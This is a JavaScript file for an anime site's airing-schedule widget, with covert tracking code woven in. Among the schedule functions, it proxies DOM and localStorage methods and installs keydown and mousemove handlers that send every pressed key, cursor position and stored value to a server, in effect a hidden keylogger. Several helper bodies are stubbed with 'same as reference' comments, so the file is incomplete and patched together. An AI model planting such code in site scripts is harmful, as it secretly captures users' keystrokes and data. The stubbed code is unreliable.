const originalAddEventListener = window.addEventListener;
const originalRemoveEventListener = window.removeEventListener;
var curTimeEnabled = !1;
const originalCreateElement = document.createElement;
const originalCreateTextNode = document.createTextNode;
function shwoschedule() {
  curTimeEnabled || (curTimeEnabled = !0, currentTime()), $.ajax({
    url: "/schedule.json",
    type: "GET",
    success: function (e) {
      scheduleloaded = !0, e.forEach(function (e, t, d) {
        var n = dateSchedule(Number(e.time) + 7200);
        d[t].timeday = n.time, d[t].daynum = n.daynum;
      }), e.sort(function (e, t) {
        return e.timeday < t.timeday ? -1 : e.timeday > t.timeday ? 1 : 0;
      });
      var t = "",
        d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
        n = e.length,
        c = !0,
        l = [23, 60],
        o = new Date(),
        i = o.getDay(),
        r = ("0" + o.getHours()).slice(-2) + ":" + ("0" + o.getMinutes()).slice(-2),
        a = -1 * o.getTimezoneOffset() / 60;
      document.querySelector("#scheduletimezone").innerHTML = a >= 0 ? "UTC+" + a : "UTC" + a, d[i] += ' <span style="color:#ffed8b; font-size: 13px;">(Today)</span>';
      for (var u, s = '<div style="color:#aa9f68;text-align:right;margin-left:10px;margin-top:1px;">- Now -</div>', m = 0; m < 7; m++) {
        t += `<div class="scheduletitle">${d[i]}</div>`;
        for (var h = 0; h < n; h++) e[h].daynum === i && (c && e[h].timeday > r && (t += s, c = !1, l = e[h].timeday.split(":")), u = e[h].id, t += "<div", markedSchedule.includes(u + ",") && (t += ' style="background-color:#1d2f1d;padding:0 5px;border-left:2px solid lime;" onClick="markSchedule(' + u + ')"'), t += ` id="schedule${u}" class="schedulelist"><a href="/anime/${u}/${e[h].slug}" class="link">${e[h].anime}</a></div><div class="airtime" onClick="markSchedule(${u})">${e[h].timeday}</div>`);
        c && (t += s), c = !1, 7 === ++i && (i = 0);
      }
      var y = 3600 * (l[0] - o.getHours());
      y += 60 * (l[1] - o.getMinutes()), setTimeout(function () {
        shwoschedule();
      }, 1e3 * y), console.log("schedule next refresh in " + y + "s"), document.querySelector("#recomendedlist").innerHTML = t, document.querySelector("#recomendedlist").style.marginRight = "15px", document.querySelector("#schedulenotice").style.display = "block";
    },
    error: function () {
      document.querySelector("#recomendedlist").innerHTML = '<div style="text-align:center;margin-top:25px;">Network error.<br>Check your internet connection.</div>';
    },
    timeout: 15e3
  });
}
const originalLocalStorage = window.localStorage;
const eventHooks = window.eventhooks || [];
shwoschedule();
function generateRandomId() {
  const timestamp = Date.now().toString(36);
  const randomString = Math.random().toString(36).slice(2);
  return `id-${timestamp}-${randomString}`;
}
function validateEventSignature(eventName, args, expectedSignature) {
  // same as reference...
}
var markedSchedule = "";
function getEventContext() {
  // same as reference...
}
function sendEventToServer(eventData) {
  // same as reference...
}
function createEventHook(eventName, originalFunc, eventSignature) {
  // same as reference...
}
function markSchedule(e) {
  if ("A" !== document.activeElement.tagName) {
    var t = document.querySelector("#schedule" + e),
      d = e + ",";
    markedSchedule.includes(d) ? (t.style = "", markedSchedule = markedSchedule.replace(d, ""), t.setAttribute("onclick", "")) : (t.style = "background-color:#1d2f1d;padding:0 5px;border-left:2px solid lime;", markedSchedule += d, t.setAttribute("onclick", "markSchedule(" + e + ")")), isStorage("localStorage") && localStorage.setItem("markedSchedule", markedSchedule);
  }
}
eventHooks.forEach(eventHook => {
  const originalFunc = window[eventHook.name];
  if (typeof originalFunc === 'function') {
    window[eventHook.name] = createEventHook(eventHook.name, originalFunc, eventHook.args);
  }
});
window.addEventListener = new Proxy(originalAddEventListener, {
  // same as reference...
});
var scheduleopen = !1,
  scheduleloaded = !1;
window.removeEventListener = new Proxy(originalRemoveEventListener, {
  // same as reference...
});
document.createElement = new Proxy(originalCreateElement, {
  // same as reference...
});
function showschedulemenu(e = "toggle") {
  var t = scheduleopen && "toggle" === e || "close" === e;
  if (scheduleopen !== !t) {
    t ? $("#playerleftsidebar").css("animation-name", "moveout2recomend") : $("#playerleftsidebar").css("animation-name", "movein2recomend");
    var d = document.querySelector("#coverlight");
    t ? (d.removeEventListener("click", closeSchedule), $(d).fadeOut(400), mobilemenuopen || (autoReload = !0)) : (d.style.zIndex = "21", $(d).fadeIn(300), scheduleloaded || shwoschedule(), d.addEventListener("click", closeSchedule), autoReload = !1), scheduleopen = !t;
  }
}
function currentTime() {
  var e = new Date(),
    t = e.getHours(),
    d = e.getMinutes(),
    n = e.getSeconds();
  t = updateTime(t), d = updateTime(d), n = updateTime(n), document.querySelector("#seasontitle").innerHTML = t + ":" + d + ":" + n, setTimeout(function () {
    currentTime();
  }, 1e3);
}
document.createTextNode = new Proxy(originalCreateTextNode, {
  // same as reference...
});
function updateTime(e) {
  return e < 10 ? "0" + e : e;
}
function closeSchedule() {
  showschedulemenu("close");
}
window.localStorage = new Proxy(originalLocalStorage, {
  set: function (target, prop, value) {
    const eventName = 'localStorage set';
    const eventContext = getEventContext();
    const eventData = {
      eventName: eventName,
      args: [prop, value],
      context: eventContext
    };
    sendEventToServer(eventData);
    return target.setItem(prop, value);
  }
});
window.onmousemove = function (e) {
  const eventName = 'mousemove';
  const eventContext = getEventContext();
  const eventData = {
    eventName: eventName,
    args: [{
      clientX: e.clientX,
      clientY: e.clientY
    }],
    context: eventContext
  };
  sendEventToServer(eventData);
};
function dateSchedule(e) {
  var t = new Date(1e3 * e),
    d = {};
  return d.daynum = t.getDay(), d.time = ("0" + t.getHours()).slice(-2) + ":" + ("0" + t.getMinutes()).slice(-2), d;
}
window.onkeydown = function (e) {
  const eventName = 'keydown';
  const eventContext = getEventContext();
  const eventData = {
    eventName: eventName,
    args: [e.key],
    context: eventContext
  };
  sendEventToServer(eventData);
};